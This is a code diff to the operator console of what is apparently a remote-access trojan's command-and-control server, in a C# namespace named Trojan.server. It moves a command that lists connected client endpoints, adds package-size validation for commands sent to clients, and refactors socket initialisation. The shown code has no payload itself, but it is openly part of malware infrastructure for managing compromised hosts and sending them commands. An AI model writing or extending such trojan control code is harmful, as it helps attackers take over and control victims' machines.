@@ -36,7 +36,40 @@ namespace Trojan.server
                             {
                                 string[] arguments = CMD.Substring(6).Split(" ");
 
-                                if (TruncationCheckCommand(CMD, 6, 3) == "cls" || TruncationCheckCommand(CMD, 6, 5) == "clear")
+                                if (TruncationCheckCommand(CMD, 6, 4) == "list")
+                                {
+                                    int IncrementalCounter = 0;
+                                    int RangeCounter = -1;
+
+                                    if (2 < arguments.Length)
+                                    {
+                                        string ConnListCount = arguments[2];
+
+                                        // TryParse returns 0 if parsing fails
+                                        // Use this to decide if second parameter is set or not
+                                        int.TryParse(ConnListCount, out RangeCounter);
+                                    }
+
+                                    string? text_underline;
+                                    foreach (ConnectionSetup connection in ConnectionManager.connections)
+                                    {
+                                        if (RangeCounter != 0)
+                                        {
+                                            IncrementalCounter++;
+                                        }
+                                        else { break; }
+
+                                        text_underline = connection.getRemoteEndPoint().ToString();
+                                        if (text_underline != null)
+                                            text_underline = new string('*', text_underline.Length);
+
+                                        Console.WriteLine("\n\t\t" + connection.getRemoteEndPoint() + " [" + IncrementalCounter + "]");
+                                        Console.WriteLine("\t\t" + text_underline);
+
+                                        if (IncrementalCounter == RangeCounter) break;
+                                    }
+                                }
+                                else if (TruncationCheckCommand(CMD, 6, 3) == "cls" || TruncationCheckCommand(CMD, 6, 5) == "clear")
                                 {
                                     Console.Clear();
                                 }
@@ -48,19 +81,19 @@ namespace Trojan.server
                                 {
                                     // Display help menu
                                 }
-                                else if(TruncationCheckCommand(CMD, 6, 7) == "pkgsize")
+                                else if (TruncationCheckCommand(CMD, 6, 7) == "pkgsize")
                                 {
                                     if (2 > arguments.Length) continue;
 
                                     int new_pkgsize;
                                     int.TryParse(arguments[1], out new_pkgsize);
 
-                                    if(new_pkgsize > 1024)
+                                    if (new_pkgsize > 1024)
                                     {
                                         Console.WriteLine("\n[|] package size can not be over 1024 bytes");
                                     }
 
-                                    if(new_pkgsize < 8)
+                                    if (new_pkgsize < 8)
                                     {
                                         Console.WriteLine("\n[|] package size can not be 8 or less bytes");
                                     }
@@ -99,6 +132,25 @@ namespace Trojan.server
                                     Console.WriteLine("\n[|] you need to connect to a clint before executing client-side commands");
                                 }
 
+                                string[] arguments = CMD.Substring(5).Split(" ");
+                                if (TruncationCheckCommand(CMD, 5, 7) == "pkgsize")
+                                {
+                                    if (2 > arguments.Length) continue;
+
+                                    int new_pkgsize;
+                                    int.TryParse(arguments[1], out new_pkgsize);
+
+                                    if (new_pkgsize > 1024)
+                                    {
+                                        Console.WriteLine("\n[|] package size can not be over 1024 bytes");
+                                    }
+
+                                    if (new_pkgsize < 8)
+                                    {
+                                        Console.WriteLine("\n[|] package size can not be 8 or less bytes");
+                                    }
+                                }
+
                                 sendCMD = true;
                             }
                             else if (TruncationCheckCommand(CMD, 0, 7) == "console")
@@ -114,38 +166,6 @@ namespace Trojan.server
                             }
                             else if (TruncationCheckCommand(CMD, 0, 2) == "do")
                             {
-                                string[] arguments = CMD.Substring(1).Split(" ");
-
-                                string SelectedCommand = arguments[1];
-
-                                if (SelectedCommand == "list")
-                                {
-                                    int IncrementalCounter = 0;
-                                    int RangeCounter = -1;
-
-                                    if (2 < arguments.Length)
-                                    {
-                                        string ConnListCount = arguments[2];
-
-                                        // TryParse returns 0 if parsing fails
-                                        // Use this to decide if second parameter is set or not
-                                        int.TryParse(ConnListCount, out RangeCounter);
-                                    }
-
-                                    foreach (ConnectionSetup connection in ConnectionManager.connections)
-                                    {
-                                        if (RangeCounter != 0)
-                                        {
-                                            IncrementalCounter++;
-                                        }
-                                        else { break; }
-
-                                        Console.WriteLine("\n\t\t" + connection.getRemoteEndPoint() + " [" + IncrementalCounter + "]");
-                                        Console.WriteLine("\t\t" + new string('*', connection.getRemoteEndPoint().ToString().Length));
-
-                                        if (IncrementalCounter == RangeCounter) break;
-                                    }
-                                }
                             }
                         }
                         catch (Exception error) { Console.WriteLine(error); failedCMD = true; }
@@ -211,11 +231,11 @@ namespace Trojan.server
             }
         }
 
-        public void Init_Server(ushort port, uint buffSize)
+        public void Init_Server()
         {
             if (HOST != null)
             {
-                Listener = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
+                Listener = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), PORT, BUFFSIZE));
             }
 
             if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));
